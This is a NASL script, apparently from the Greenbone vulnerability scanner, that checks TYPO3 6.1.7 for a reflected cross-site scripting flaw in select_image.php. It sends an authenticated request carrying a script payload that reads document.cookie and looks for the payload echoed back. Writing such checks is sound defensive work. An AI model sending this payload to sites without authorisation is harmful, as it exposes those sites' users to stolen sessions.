CPE = "cpe:/a:typo3:typo3";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.903230" );
	script_version( "2021-08-04T10:08:11+0000" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2021-08-04 10:08:11 +0000 (Wed, 04 Aug 2021)" );
	script_tag( name: "creation_date", value: "2014-02-25 19:17:38 +0530 (Tue, 25 Feb 2014)" );
	script_name( "TYPO3 select_image.php Cross Site Scripting Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_typo3_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "TYPO3/installed" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/typo3-617-xss-disclosure-shell-upload" );
	script_tag( name: "summary", value: "This host is installed with TYPO3 and is prone to cross site scripting
  vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request and check whether it is able to read the
  cookie or not." );
	script_tag( name: "insight", value: "Flaw is due to improper validation of user-supplied input passed to
  'RTEtsConfigParams' parameter in 'select_image.php' page." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "TYPO3 6.1.7, previous versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("url_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
require("gvr_apps_auth_func.inc.sc");
if(!typo_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: typo_port )){
	exit( 0 );
}
useragent = http_get_user_agent();
host = http_host_name( port: typo_port );
cookie = get_typo3_login_cookie( cinstall: dir, tport: typo_port, chost: host );
if(cookie){
	url = dir + "/typo3/sysext/rtehtmlarea/mod4/select_image.php?RTEtsConfigParams=<script>alert(document.cookie)</script>";
	req = NASLString( "GET ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Cookie: ", cookie, "\\r\\n\\r\\n" );
	res = http_keepalive_send_recv( port: typo_port, data: req, bodyonly: FALSE );
	if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "<script>alert(document.cookie)</script>" )){
		security_message( typo_port );
		exit( 0 );
	}
}

